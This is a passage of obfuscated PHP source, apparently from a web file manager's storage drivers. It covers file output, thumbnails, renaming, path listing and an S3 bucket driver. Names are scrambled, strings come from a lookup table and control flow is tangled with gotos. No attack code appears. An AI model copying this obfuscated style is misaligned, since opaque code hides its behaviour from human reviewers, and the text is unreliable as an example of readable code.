$B»¦ÉÊ‹ˆ® += $b·î¦°Ë»š; if ($b·î¦°Ë»š == $fõÔò‹‘ìË) { $B»¦ÉÊ‹ˆ® = $A²³²Ò“¸‚ + 1; } if ($D‡àšÂ¡”) { $FİâÍéˆ† = intval(1000 * 1000 * (timeFloat() - $f…È»ĞçÔ)); $a§©îë—Í = $D‡àšÂ¡” - $FİâÍéˆ†; if ($a§©îë—Í > 5) { usleep($a§©îë—Í); } } } goto AŸ©óàåìÅ; D½·‰òÈ‹¿: $B»¦ÉÊ‹ˆ® = 0; $A²³²Ò“¸‚ = $dï°ã’¹¸ - 1; $B÷Â¥†Û£œ = $this->ext($Dª©‚ò§ÄÆ); goto FñÈ¤Å­Û°; eî¡¢Ó°î: $Eèšé¡öº = $this->getType() == $Bõ»¡¦æà[102]; $F“‡õİ„Æ = $GLOBALS[$Bõ»¡¦æà[6]][$Bõ»¡¦æà[84]][$Bõ»¡¦æà[103]][$Bõ»¡¦æà[104]]; $D¨”–š­³ = (double) $GLOBALS[$Bõ»¡¦æà[6]][$Bõ»¡¦æà[84]][$Bõ»¡¦æà[103]][$Bõ»¡¦æà[105]] * 1024 * 1024; goto F‚÷ØÂòÚÕ; dĞ¶ÈáÍåŸ: header($Bõ»¡¦æà[125]); header($Bõ»¡¦æà[126]); header($Bõ»¡¦æà[127]); goto cœ¶­ˆ¤‚¤; F¶ÏÜãã‹…: $dï°ã’¹¸ = $a¥Èµ–±„Ô[$Bõ»¡¦æà[77]]; $D£¢°¨±¤² = gmdate($Bõ»¡¦æà[106], $a¥Èµ–±„Ô[$Bõ»¡¦æà[107]]); $Dª©‚ò§ÄÆ = $eÓ´•÷ÁÜß ? $eÓ´•÷ÁÜß : $this->iconvApp($a¥Èµ–±„Ô[$Bõ»¡¦æà[28]]); goto D½·‰òÈ‹¿; b‚°ÏİÔÃ·: $BÈ“¡¢õˆÍ = rawurlencode($Dª©‚ò§ÄÆ); $BÈ“¡¢õˆÍ = $Bõ»¡¦æà[113] . $BÈ“¡¢õˆÍ . $Bõ»¡¦æà[117] . $BÈ“¡¢õˆÍ; if ($eÔ‡‚Èãë) { header($Bõ»¡¦æà[118]); header($Bõ»¡¦æà[119] . $BÈ“¡¢õˆÍ); } else { header($Bõ»¡¦æà[120] . $BÈ“¡¢õˆÍ); } goto E‚•ÍõÙ»; C§ÕÄ®óõ†: if ($_SERVER[$Bõ»¡¦æà[154]] == $Bõ»¡¦æà[155]) { return; } $b·î¦°Ë»š = 1024 * 100; $D‡àšÂ¡” = 0; goto Bé‹Û÷ÍÉÍ; AŸ©óàåìÅ: } public function fileOutServer($D“çÓ†®‘, $dÃĞ°›ğ£ = false, $cÖšÎÛÀÒø = false, $c¸ÖëãíÍŞ = '') { $this->fileOut($D“çÓ†®‘, $dÃĞ°›ğ£, $cÖšÎÛÀÒø, $c¸ÖëãíÍŞ); } public function fileOutLink($FÔ·ù©°¿Ğ) { header($_SERVER[Î¿—”òá][156] . $FÔ·ù©°¿Ğ); die; } public function cacheMethod($D¢Ê™“ø¡, $e»¹ËÒ‡‚) { goto CíÑ°Ù‰Ò; CíÑ°Ù‰Ò: $AğŠù½í³Ä =& $_SERVER[Î¿—”òá]; static $d‘Ş¦·öèö = array(); $BÂ…Şø·Âí = $e»¹ËÒ‡‚ ? ltrim($this->getPathOuter($e»¹ËÒ‡‚), $AğŠù½í³Ä[8]) : $e»¹ËÒ‡‚; goto FÔÉæåªŸ¸; FÔÉæåªŸ¸: $bÁŸ ò†¢‡ = $AğŠù½í³Ä[157] . $D¢Ê™“ø¡ . $AğŠù½í³Ä[158] . rtrim($BÂ…Şø·Âí, $AğŠù½í³Ä[8]); if (is_null($D¢Ê™“ø¡)) { $d‘Ş¦·öèö = array(); return; } if (is_null($e»¹ËÒ‡‚)) { unset($d‘Ş¦·öèö[$bÁŸ ò†¢‡]); return; } goto C¤º–ŸÓ‡²; AŸï‡¼–ó: $d‘Ş¦·öèö[$bÁŸ ò†¢‡] = $cºòÑ²Œã; return $cºòÑ²Œã; goto cÂº¸‰Öô²; C¤º–ŸÓ‡²: $cºòÑ²Œã = isset($d‘Ş¦·öèö[$bÁŸ ò†¢‡]) ? $d‘Ş¦·öèö[$bÁŸ ò†¢‡] : null; if (!is_null($cºòÑ²Œã)) { return $cºòÑ²Œã; } $cºòÑ²Œã = $this->{$D¢Ê™“ø¡}($e»¹ËÒ‡‚); goto AŸï‡¼–ó; cÂº¸‰Öô²: } public function fileOutImage($dŸ‚¬îÙ½Â, $d‘ƒİô³¶Ï = 250) { goto DØµÍæºĞô; cš²ïî¹¿Ä: if (!($b…ôë“¶² = IO::move($fÑ‰Ï…•Ì¨, $B©ÏŒäŸ´))) { return IO::fileOut($fÑ‰Ï…•Ì¨); } del_file($fÑ‰Ï…•Ì¨); IO::fileOut($b…ôë“¶²); goto F½Ì±Îó¸Ÿ; DØµÍæºĞô: $fà–Ïô‰®ã =& $_SERVER[Î¿—”òá]; if (substr($dŸ‚¬îÙ½Â, 0, 4) == $fà–Ïô‰®ã[144]) { $this->fileOutLink($dŸ‚¬îÙ½Â); } $eô¨Á‰½Ø¡ = $this->info($dŸ‚¬îÙ½Â); goto Aˆ¢ö‡Ş’ç; Aˆ¢ö‡Ş’ç: if ($eô¨Á‰½Ø¡[$fà–Ïô‰®ã[77]] <= 1024 * 50 || !function_exists($fà–Ïô‰®ã[159]) || $eô¨Á‰½Ø¡[$fà–Ïô‰®ã[160]] == $fà–Ïô‰®ã[161]) { return $this->fileOut($dŸ‚¬îÙ½Â); } if (isset($eô¨Á‰½Ø¡[$fà–Ïô‰®ã[162]][$fà–Ïô‰®ã[163]])) { $BßŞëÛåïï = $eô¨Á‰½Ø¡[$fà–Ïô‰®ã[162]][$fà–Ïô‰®ã[163]]; } else { if (isset($eô¨Á‰½Ø¡[$fà–Ïô‰®ã[162]][$fà–Ïô‰®ã[164]])) { $BßŞëÛåïï = $eô¨Á‰½Ø¡[$fà–Ïô‰®ã[162]][$fà–Ïô‰®ã[164]]; } else { $BßŞëÛåïï = md5("{$eô¨Á‰½Ø¡[$fà–Ïô‰®ã[28]]}\137{$eô¨Á‰½Ø¡[$fà–Ïô‰®ã[75]]}\137{$eô¨Á‰½Ø¡[$fà–Ïô‰®ã[77]]}"); } } $d¸”äÌ¼Â‹ = "{$BßŞëÛåïï}\137{$d‘ƒİô³¶Ï}\56\160\156\147"; goto b×‰³íàì‡; b×‰³íàì‡: if (!($e”ë°Í‹Èâ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $fà–Ïô‰®ã[165]))) { $B©ÏŒäŸ´ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $fà–Ïô‰®ã[166]); } else { $B©ÏŒäŸ´ = KodIO::make($e”ë°Í‹Èâ); } if ($e”ë°Í‹Èâ = IO::fileNameExist($B©ÏŒäŸ´, $d¸”äÌ¼Â‹)) { $fÑ‰Ï…•Ì¨ = KodIO::make($e”ë°Í‹Èâ); return IO::fileOut($fÑ‰Ï…•Ì¨); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto däÜØì¸‰»; däÜØì¸‰»: $fÑ‰Ï…•Ì¨ = DATA_THUMB . $d¸”äÌ¼Â‹; if (!@file_exists($fÑ‰Ï…•Ì¨)) { $B¥Õğ×¯Ø = TEMP_FILES; if (!is_dir($B¥Õğ×¯Ø)) { mk_dir($B¥Õğ×¯Ø); } $b·Ğé¹Ş†§ = $B¥Õğ×¯Ø . $BßŞëÛåïï . $fà–Ïô‰®ã[91] . $eô¨Á‰½Ø¡[$fà–Ïô‰®ã[160]]; if (!@file_exists($b·Ğé¹Ş†§)) { $b·Ğé¹Ş†§ = $this->download($dŸ‚¬îÙ½Â, $b·Ğé¹Ş†§); } $EéƒÉãªÁ = new ImageThumb($b·Ğé¹Ş†§, $fà–Ïô‰®ã[167]); $EéƒÉãªÁ->prorate($fÑ‰Ï…•Ì¨, $d‘ƒİô³¶Ï, $d‘ƒİô³¶Ï * 10); } if (!file_exists($fÑ‰Ï…•Ì¨) || filesize($fÑ‰Ï…•Ì¨) < 100) { return @file_exists($b·Ğé¹Ş†§) ? IO::fileOut($b·Ğé¹Ş†§) : $this->fileOut($dŸ‚¬îÙ½Â); } goto cš²ïî¹¿Ä; F½Ì±Îó¸Ÿ: } public function fileOutImageServer($c‰®ù¢²Üç, $C¡ÎèŒ–¤ä = 250) { $this->fileOutImage($c‰®ù¢²Üç, $C¡ÎèŒ–¤ä); } public function fileNameAuto($D­¬ÎÖß²’, $EŒ¶¸´”«£, $aë¥ŠÃæ‡É = REPEAT_RENAME, $fçºÒ›³Âä = false) { goto eº†£ßôéî; CŒ˜ÂŒŸ³È: while ($this->exist(rtrim($D­¬ÎÖß²’, $fÀ¯Æ¯Œ[8]) . $fÀ¯Æ¯Œ[8] . $B½¤‹Ÿ—îÜ)) { $B½¤‹Ÿ—îÜ = $C†½„Æ­˜ . "\50{$C½¡øãÓ³}\51{$e²Ñá±‡ñ}"; $C½¡øãÓ³++; } return $B½¤‹Ÿ—îÜ; goto d§ÖªÎ¦Õµ; b…Ğ–Ü¦®É: if ($aë¥ŠÃæ‡É == REPEAT_SKIP) { return !1; } $e²Ñá±‡ñ = $fÀ¯Æ¯Œ[91] . get_path_ext($EŒ¶¸´”«£); $e²Ñá±‡ñ = $e²Ñá±‡ñ == $fÀ¯Æ¯Œ[91] || $fçºÒ›³Âä ? $fÀ¯Æ¯Œ[33] : $e²Ñá±‡ñ; goto CïÕÕ““¡Ø; CïÕÕ““¡Ø: $C½¡øãÓ³ = 1; $C†½„Æ­˜ = substr($EŒ¶¸´”«£, 0, strlen($EŒ¶¸´”«£) - strlen($e²Ñá±‡ñ)); $B½¤‹Ÿ—îÜ = $C†½„Æ­˜ . "\50{$C½¡øãÓ³}\x29{$e²Ñá±‡ñ}"; goto CŒ˜ÂŒŸ³È; eº†£ßôéî: $fÀ¯Æ¯Œ =& $_SERVER[Î¿—”òá]; $dŸßÌ¯£±¥ = $D­¬ÎÖß²’ === $fÀ¯Æ¯Œ[33] ? $EŒ¶¸´”«£ : rtrim($D­¬ÎÖß²’, $fÀ¯Æ¯Œ[8]) . $fÀ¯Æ¯Œ[8] . $EŒ¶¸´”«£; if ($aë¥ŠÃæ‡É == REPEAT_REPLACE || !$this->exist($dŸßÌ¯£±¥) || $fçºÒ›³Âä && $aë¥ŠÃæ‡É != REPEAT_RENAME_FOLDER) { return $EŒ¶¸´”«£; } goto b…Ğ–Ü¦®É; d§ÖªÎ¦Õµ: } public function listAllFiles($eó®èÁ¸Ã, $A£Ü°ì‰ƒ°, $aô‹äÇ¸ë = array()) { goto c¹ãÒéöãâ; dÌÌøÓğÏ¡: foreach (array_unique($bª¤Ù˜Öå¬) as $f¨Ì¶¨ã³×) { $c±ÙÅ×‚ÄÃ = array($d¢¿º’«®Ç[75] => $this->getPathOuter($d¢¿º’«®Ç[8] . $eó®èÁ¸Ã . $d¢¿º’«®Ç[8] . $f¨Ì¶¨ã³×), $d¢¿º’«®Ç[76] => 1, $d¢¿º’«®Ç[77] => 0); if (substr($f¨Ì¶¨ã³×, -1) != $d¢¿º’«®Ç[8]) { $c±ÙÅ×‚ÄÃ[$d¢¿º’«®Ç[76]] = 0; $a«†½ë††© = $this->getPath($eó®èÁ¸Ã . $d¢¿º’«®Ç[8] . $f¨Ì¶¨ã³×); $c±ÙÅ×‚ÄÃ[$d¢¿º’«®Ç[77]] = isset($aô‹äÇ¸ë[$a«†½ë††©]) ? $aô‹äÇ¸ë[$a«†½ë††©] : $this->size($a«†½ë††©); } $eŠµ‚Ø¸’¥[] = $c±ÙÅ×‚ÄÃ; } return $eŠµ‚Ø¸’¥; goto dÂäÛ¬µ·Ô; c¹ãÒéöãâ: $d¢¿º’«®Ç =& $_SERVER[Î¿—”òá]; if (empty($A£Ü°ì‰ƒ°)) { return array(); } $bª¤Ù˜Öå¬ = array(); goto A²ÓóÆ‡Œğ; A²ÓóÆ‡Œğ: $eó®èÁ¸Ã = trim($eó®èÁ¸Ã, $d¢¿º’«®Ç[8]); foreach ($A£Ü°ì‰ƒ° as $f¨Ì¶¨ã³×) { $b£«‡³¸§Ó = ltrim(substr($f¨Ì¶¨ã³×, strlen($eó®èÁ¸Ã)), $d¢¿º’«®Ç[8]); $bª¤Ù˜Öå¬ = array_merge($bª¤Ù˜Öå¬, $this->slicePath($b£«‡³¸§Ó)); } $eŠµ‚Ø¸’¥ = array(); goto dÌÌøÓğÏ¡; dÂäÛ¬µ·Ô: } public function slicePath($BâÜÅãïÇö) { $dŒöïˆÕÆâ =& $_SERVER[Î¿—”òá]; $E·Ô†ÎßÛ  = explode($dŒöïˆÕÆâ[8], trim($BâÜÅãïÇö, $dŒöïˆÕÆâ[8])); $Eâ§Ã‚–‘¦ = 0; do { ++$Eâ§Ã‚–‘¦; $d«ÂÍÇø˜[] = implode($dŒöïˆÕÆâ[8], array_slice($E·Ô†ÎßÛ , 0, $Eâ§Ã‚–‘¦)) . $dŒöïˆÕÆâ[8]; } while ($Eâ§Ã‚–‘¦ < count($E·Ô†ÎßÛ )); $d«ÂÍÇø˜[count($E·Ô†ÎßÛ ) - 1] = $BâÜÅãïÇö; return $d«ÂÍÇø˜; } public function getHost() { $B«í‘‹ôª =& $_SERVER[Î¿—”òá]; $E˜ÑŒÃğ = parse_url(trim($this->domain, $B«í‘‹ôª[8])); $báê†Šî‹Ä = isset($E˜ÑŒÃğ[$B«í‘‹ôª[168]]) ? $E˜ÑŒÃğ[$B«í‘‹ôª[168]] : http_type(); $B¢¿È“íà = isset($E˜ÑŒÃğ[$B«í‘‹ôª[169]]) ? $E˜ÑŒÃğ[$B«í‘‹ôª[169]] : $E˜ÑŒÃğ[$B«í‘‹ôª[75]]; if (isset($E˜ÑŒÃğ[$B«í‘‹ôª[170]])) { $B¢¿È“íà .= $B«í‘‹ôª[4] . $E˜ÑŒÃğ[$B«í‘‹ôª[170]]; } return $báê†Šî‹Ä . $B«í‘‹ôª[171] . $B¢¿È“íà; } public function pathEncode($f¡ˆ¿¨›) { $F·İ¿•¹ˆ¡ =& $_SERVER[Î¿—”òá]; return str_replace($F·İ¿•¹ˆ¡[172], $F·İ¿•¹ˆ¡[8], rawurlencode($f¡ˆ¿¨›)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($fôÚˆèÅ´¿) { set_timeout(); require_once SDK_DIR . $_SERVER[Î¿—”òá][173]; parent::__construct(); $this->_init($fôÚˆèÅ´¿); } public function _init($C‰Æ²¼Í“‘) { foreach ($C‰Æ²¼Í“‘ as $Eò™­Ş’… => $AŠ¡ê¡™ôï) { if (isset($this->{$Eò™­Ş’…})) { $this->{$Eò™­Ş’…} = $AŠ¡ê¡™ôï; } } $this->endpoint = $C‰Æ²¼Í“‘[$_SERVER[Î¿—”òá][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($eƒİªĞĞèÉ = "\166\x34") { $this->signVer = $eƒİªĞĞèÉ; $this->client->setSignatureVersion($eƒİªĞĞèÉ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto D÷ğÖñøİõ; D÷ğÖñøİõ: $bÚ¤©‡‰‡è =& $_SERVER[Î¿—”òá]; $e¤ƒë»›Æ = $this->getBucketCors(); if (!$e¤ƒë»›Æ || !is_array($e¤ƒë»›Æ)) { return !1; } goto b©ÚÓ´ñÊë; F­âõÅì: $A´ƒšÌ«¬¾ = array($bÚ¤©‡‰‡è[180], $bÚ¤©‡‰‡è[181], $bÚ¤©‡‰‡è[182], $bÚ¤©‡‰‡è[183], $bÚ¤©‡‰‡è[184]); $cØùÈã‡³ = array_diff($A´ƒšÌ«¬¾, $Dˆéä ìèÕ); return empty($cØùÈã‡³); goto E¾œË¶¥ç˜; b©ÚÓ´ñÊë: if ($e¤ƒë»›Æ[$bÚ¤©‡‰‡è[175]] != $bÚ¤©‡‰‡è[176] || $e¤ƒë»›Æ[$bÚ¤©‡‰‡è[177]] != $bÚ¤©‡‰‡è[176]) { return !1; } $Dˆéä ìèÕ = array_map($bÚ¤©‡‰‡è[178], $e¤ƒë»›Æ[$bÚ¤©‡‰‡è[179]]); if (!is_array($Dˆéä ìèÕ)) { $Dˆéä ìèÕ = array(); } goto F­âõÅì; E¾œË¶¥ç˜: } public function mkfile($bä¡ˆÍçõ, $C¡Ï¼ïŸÄ = '', $BÌŞÅ¸¤¡¢ = REPEAT_RENAME) { $c©Ê‰²Òë‰ = $this->setContent($bä¡ˆÍçõ, $C¡Ï¼ïŸÄ); if ($c©Ê‰²Òë‰ !== !1) { return $this->getPathOuter($bä¡ˆÍçõ); } return !1; } public function mkdir($CØÙÂØ§ï, $aˆÒëó¯ © = REPEAT_SKIP) { if (empty($CØÙÂØ§ï)) { return !1; } if ($this->_isFolder($CØÙÂØ§ï)) { return $this->getPathOuter($CØÙÂØ§ï); } $AÂÃ—Ø•Ä = $this->setContent($CØÙÂØ§ï, $_SERVER[Î¿—”òá][33], !0); if ($AÂÃ—Ø•Ä !== !1) { return $this->getPathOuter($CØÙÂØ§ï); } return !1; } public function copyFile($d—‰£©–Ã, $fƒŠ¦—±â², $Bï·í—øÎË = array()) { $DÂ‹Ø¢«¦‰ =& $_SERVER[Î¿—”òá]; $AÁ‡ê«ºøÚ = $this->objectMeta($d—‰£©–Ã); if (!$AÁ‡ê«ºøÚ) { return !1; } if ($AÁ‡ê«ºøÚ[$DÂ‹Ø¢«¦‰[77]] <= 1024 * 1024 * 200) { $dÛç¯òğ = $this->client->copyObject($this->bucket, $d—‰£©–Ã, $this->bucket, $fƒŠ¦—±â², $DÂ‹Ø¢«¦‰[185], $Bï·í—øÎË); } else { $dÛç¯òğ = $this->client->multiCopyObject($this->bucket, $d—‰£©–Ã, $this->bucket, $fƒŠ¦—±â², $Bï·í—øÎË); } $dÛç¯òğ = $dÛç¯òğ ? $this->getPathOuter($fƒŠ¦—±â²) : !1; return $dÛç¯òğ; } public function moveFile($fœäÒÑà±, $d«ä¶ì‘‹È) { if ($this->copyFile($fœäÒÑà±, $d«ä¶ì‘‹È)) { $this->delFile($fœäÒÑà±); return $this->getPathOuter($d«ä¶ì‘‹È); } return !1; } public function delFile($a×êÆĞŒâ…) { return $this->client->deleteObject($this->bucket, $a×êÆĞŒâ…); } public function delFolder($BÍÙÀ‰ìã) { goto e„£·¹ÂŞ; e„£·¹ÂŞ: $e½ÛÂ†¼Ì =& $_SERVER[Î¿—”òá]; $dµßµŸœá = $this->listObjs($BÍÙÀ‰ìã); if (!$dµßµŸœá) { $BÍÙÀ‰ìã = trim($BÍÙÀ‰ìã, $e½ÛÂ†¼Ì[8]); if (!empty($BÍÙÀ‰ìã)) { $BÍÙÀ‰ìã .= $e½ÛÂ†¼Ì[8]; } return $this->delFile($BÍÙÀ‰ìã); } goto CŞ² ™É³è; CŞ² ™É³è: $F˜ÉÛ·Û¬ = $B‚´˜Â½ã‡ = 0; $Cµ°ÏÕí® = array_chunk(array_keys($dµßµŸœá), 1000); foreach ($Cµ°ÏÕí® as $cå‰œÎ›–‚) { $F˜ÉÛ·Û¬++; $B‚´˜Â½ã‡ += (int) $this->client->deleteObjects($this->bucket, $cå‰œÎ›–‚); } goto F¼ƒˆæƒ›; F¼ƒˆæƒ›: return $F˜ÉÛ·Û¬ === $B‚´˜Â½ã‡ ? !0 : !1; goto e°ŠˆÆ¤Â…; e°ŠˆÆ¤Â…: } public function rename($D—½ø«ùº, $f®Òáá¶¿Ã) { return $this->renameObject($D—½ø«ùº, $f®Òáá¶¿Ã); } public function listPath($aíáÍ¡ù˜µ, $eĞáæÆµÏ× = false) { $dÕŸªÇâ¯¨ =& $_SERVER[Î¿—”òá]; $aåŞª¶½–ö = $this->listObjs($aíáÍ¡ù˜µ, null, null, $dÕŸªÇâ¯¨[8]); $fÓóò•Ë¹³ = array($dÕŸªÇâ¯¨[74] => array(), $dÕŸªÇâ¯¨[73] => array()); foreach ($aåŞª¶½–ö as $Aö¸‰±â¼Õ => $DĞËò¬ö) { if ($Aö¸‰±â¼Õ == $dÕŸªÇâ¯¨[8]) { continue; } if (isset($DĞËò¬ö[$dÕŸªÇâ¯¨[186]])) { $fÓóò•Ë¹³[$dÕŸªÇâ¯¨[74]][] = $this->folderInfo($DĞËò¬ö[$dÕŸªÇâ¯¨[186]], $eĞáæÆµÏ×); } else { if (substr($DĞËò¬ö[$dÕŸªÇâ¯¨[28]], -1) == $dÕŸªÇâ¯¨[8]) { continue; } $fÓóò•Ë¹³[$dÕŸªÇâ¯¨[73]][] = $this->fileInfo($DĞËò¬ö[$dÕŸªÇâ¯¨[28]], $eĞáæÆµÏ×, $DĞËò¬ö); } } return $fÓóò•Ë¹³; } private function fileInfo($BĞÊÙµîİñ, $E…µ×´Íî÷ = false, $b²ŞååªÎ = array()) { goto fŒ”Ñ°É; f­¹ƒƒªãÌ: return $C¸øŒÔŞƒ; goto A¼ƒ—†¾¥¡; fŒ”Ñ°É: $B‚¸ª…‰ÂÀ =& $_SERVER[Î¿—”òá]; if ($E…µ×´Íî÷) { return array($B‚¸ª…‰ÂÀ[28] => $this->pathThis($BĞÊÙµîİñ), $B‚¸ª…‰ÂÀ[75] => $this->getPathOuter($BĞÊÙµîİñ), $B‚¸ª…‰ÂÀ[29] => $B‚¸ª…‰ÂÀ[167], $B‚¸ª…‰ÂÀ[160] => $this->ext($BĞÊÙµîİñ), $B‚¸ª…‰ÂÀ[77] => isset($b²ŞååªÎ[$B‚¸ª…‰ÂÀ[77]]) ? $b²ŞååªÎ[$B‚¸ª…‰ÂÀ[77]] : 0, $B‚¸ª…‰ÂÀ[187] => 0, $B‚¸ª…‰ÂÀ[107] => 0, $B‚¸ª…‰ÂÀ[188] => !0, $B‚¸ª…‰ÂÀ[189] => !0); } $C¸øŒÔŞƒ = array($B‚¸ª…‰ÂÀ[28] => $this->pathThis($BĞÊÙµîİñ), $B‚¸ª…‰ÂÀ[75] => $this->getPathOuter($BĞÊÙµîİñ), $B‚¸ª…‰ÂÀ[29] => $B‚¸ª…‰ÂÀ[167], $B‚¸ª…‰ÂÀ[187] => 0, $B‚¸ª…‰ÂÀ[107] => 0, $B‚¸ª…‰ÂÀ[77] => 0, $B‚¸ª…‰ÂÀ[160] => $this->ext($BĞÊÙµîİñ), $B‚¸ª…‰ÂÀ[188] => !0, $B‚¸ª…‰ÂÀ[189] => !0); goto cĞé›¼Ù–; cĞé›¼Ù–: if (empty($b²ŞååªÎ)) { $b²ŞååªÎ = $this->objectMeta($BĞÊÙµîİñ); if (!$b²ŞååªÎ) { return $C¸øŒÔŞƒ; } } if (isset($b²ŞååªÎ[$B‚¸ª…‰ÂÀ[190]])) { $C¸øŒÔŞƒ[$B‚¸ª…‰ÂÀ[107]] = $b²ŞååªÎ[$B‚¸ª…‰ÂÀ[190]]; } if (isset($b²ŞååªÎ[$B‚¸ª…‰ÂÀ[77]])) { $C¸øŒÔŞƒ[$B‚¸ª…‰ÂÀ[77]] = $b²ŞååªÎ[$B‚¸ª…‰ÂÀ[77]]; } goto f­¹ƒƒªãÌ; A¼ƒ—†¾¥¡: } private function folderInfo($eä‚ëµê²Ğ, $c¬í›Øòë = false) { goto d¯Œ˜³¸ƒ¶; d¯Œ˜³¸ƒ¶: $C’‚‡Çç =& $_SERVER[Î¿—”òá]; if ($c¬í›Øòë) { return array($C’‚‡Çç[28] => $this->pathThis($eä‚ëµê²Ğ), $C’‚‡Çç[75] => $this->getPathOuter($C’‚‡Çç[8] . $eä‚ëµê²Ğ), $C’‚‡Çç[29] => $C’‚‡Çç[76], $C’‚‡Çç[188] => !0, $C’‚‡Çç[189] => !0); } $f„í’£õöÑ = array($C’‚‡Çç[28] => $this->pathThis($eä‚ëµê²Ğ), $C’‚‡Çç[75] => $this->getPathOuter($C’‚‡Çç[8] . $eä‚ëµê²Ğ), $C’‚‡Çç[29] => $C’‚‡Çç[76], $C’‚‡Çç[187] => 0, $C’‚‡Çç[107] => 0, $C’‚‡Çç[188] => !0, $C’‚‡Çç[189] => !0); goto Cá¶öÍ··à; f·ŠÃ‚‹ŠÎ: if (isset($cÍ¸Õö…Ç[$C’‚‡Çç[190]])) { $f„í’£õöÑ[$C’‚‡Çç[187]] = $cÍ¸Õö…Ç[$C’‚‡Çç[190]]; } return $f„í’£õöÑ; goto F´Ñ³÷®“É; Cá¶öÍ··à: if ($eä‚ëµê²Ğ == $C’‚‡Çç[33]) { return $f„í’£õöÑ; } $eä‚ëµê²Ğ = trim($eä‚ëµê²Ğ, $C’‚‡Çç[8]) . $C’‚‡Çç[8]; $cÍ¸Õö…Ç = $this->objectMeta($eä‚ëµê²Ğ); goto f·ŠÃ‚‹ŠÎ; F´Ñ³÷®“É: } public function listObjs($aÀ…ŠÁ, $a”šÁ‘›‹¨ = null, $cœÜº¬‘¿Ô = null, $E½·àµÁÑï = null) { $FÒ„Ë‡Šˆß =& $_SERVER[Î¿—”òá]; $aÀ…ŠÁ = trim($aÀ…ŠÁ, $FÒ„Ë‡Šˆß[8]); $fßí±³¿’ = empty($aÀ…ŠÁ) ? $FÒ„Ë‡Šˆß[33] : $aÀ…ŠÁ . $FÒ„Ë‡Šˆß[8]; return $this->client->getBucket($this->bucket, $fßí±³¿’, $a”šÁ‘›‹¨, $cœÜº¬‘¿Ô, $E½·àµÁÑï, !0); } public function has($F„Šöã¥‰Û, $féÆá÷º©± = false, $FêÕØîˆˆ = true) { goto e¼»§‘‚— ; cµ·½Ä: $c†‘¸åàÆ® = $this->listObjs($F„Šöã¥‰Û, null, null, $B¯¼ÊùŞ‹¶[8]); $c†‘¸åàÆ® = is_array($c†‘¸åàÆ®) ? $c†‘¸åàÆ® : array(); foreach ($c†‘¸åàÆ® as $bñ­¤¶±Ş•) { if (isset($bñ­¤¶±Ş•[$B¯¼ÊùŞ‹¶[28]]) && substr($bñ­¤¶±Ş•[$B¯¼ÊùŞ‹¶[28]], -1) != $B¯¼ÊùŞ‹¶[8]) { if (!$féÆá÷º©± && $FêÕØîˆˆ) { return !0; } $C¿£¨«ò¨++; } else { if (isset($bñ­¤¶±Ş•[$B¯¼ÊùŞ‹¶[186]])) { if (!$féÆá÷º©± && !$FêÕØîˆˆ) { return !1; } $f®¼”¡¤†£++; } } } goto dØÁˆ´ÌÌõ; e¼»§‘‚— : $B¯¼ÊùŞ‹¶ =& $_SERVER[Î¿—”òá]; $C¿£¨«ò¨ = 0; $f®¼”¡¤†£ = 0; goto cµ·½Ä; dØÁˆ´ÌÌõ: if ($féÆá÷º©±) { return array($B¯¼ÊùŞ‹¶[191] => $C¿£¨«ò¨, $B¯¼ÊùŞ‹¶[192] => $f®¼”¡¤†£); } return !1; goto EÙÔ‹ò‘Æâ; EÙÔ‹ò‘Æâ: } public function listAll($cèøÈôõÓ) { $cíÅ—Š¬¦ =& $_SERVER[Î¿—”òá]; $D°†îìğõ = $this->listObjs($cèøÈôõÓ); $C…Ü÷åÊ¶­ = $CÂÆ»ì©Ï = array(); foreach ($D°†îìğõ as $fšº¾œÂ => $F®ß°ÈÈÛ¨) { $C…Ü÷åÊ¶­[] = $F®ß°ÈÈÛ¨[$cíÅ—Š¬¦[28]]; $CÂÆ»ì©Ï[$fšº¾œÂ] = $F®ß°ÈÈÛ¨[$cíÅ—Š¬¦[77]]; } return $this->listAllFiles($cèøÈôõÓ, $C…Ü÷åÊ¶­, $CÂÆ»ì©Ï); } public function canRead($e¶ŸÚáš‚À) { $FÅóª¼äØ„ =& $_SERVER[Î¿—”òá]; $A‚‚åŠçø = $this->client->getAccessControlPolicy($this->bucket, $e¶ŸÚáš‚À); if (!$A‚‚åŠçø) { return !1; } return in_array($A‚‚åŠçø, array($FÅóª¼äØ„[193], $FÅóª¼äØ„[194], $FÅóª¼äØ„[195])) ? !0 : !1; } public function canWrite($fÎÕ¡šèß) { $cÔíí†› =& $_SERVER[Î¿—”òá]; $bˆóŠ‘Š²¶ = $this->client->getAccessControlPolicy($this->bucket, $fÎÕ¡šèß); if (!$bˆóŠ‘Š²¶) { return !1; } return in_array($bˆóŠ‘Š²¶, array($cÔíí†›[193], $cÔíí†›[194])) ? !0 : !1; } public function getContent($a¿‘ù‹ŒÅ©) { return $this->client->getObject($this->bucket, $a¿‘ù‹ŒÅ©); } public function setContent($EùÌğËÈã•, $d‚§÷®Ì‡¯ = '', $Eå¸¸‹¿âö = false) { goto fš¿‹£öÛ; fš¿‹£öÛ: $bÌÕåíƒÊä =& $_SERVER[Î¿—”òá]; $EùÌğËÈã• = $Eå¸¸‹¿âö ? trim($EùÌğËÈã•, $bÌÕåíƒÊä[8]) . $bÌÕåíƒÊä[8] : $EùÌğËÈã•; $AêÓà—šÕŠ = get_file_mime(get_path_ext($EùÌğËÈã•)); goto AˆÇ…†Ø·; AˆÇ…†Ø·: $EÇ¯ÒÂáÛ = $this->client->putObject($d‚§÷®Ì‡¯, $this->bucket, $EùÌğËÈã•, $bÌÕåíƒÊä[185], array(), $AêÓà—šÕŠ); if (!$EÇ¯ÒÂáÛ) { return !1; } if ($Eå¸¸‹¿âö) { return !0; } goto A‡ÜÒåˆ ‚; A‡ÜÒåˆ ‚: $EÇ¯ÒÂáÛ = $this->copyFile($EùÌğËÈã•, $EùÌğËÈã•, array($bÌÕåíƒÊä[196] => 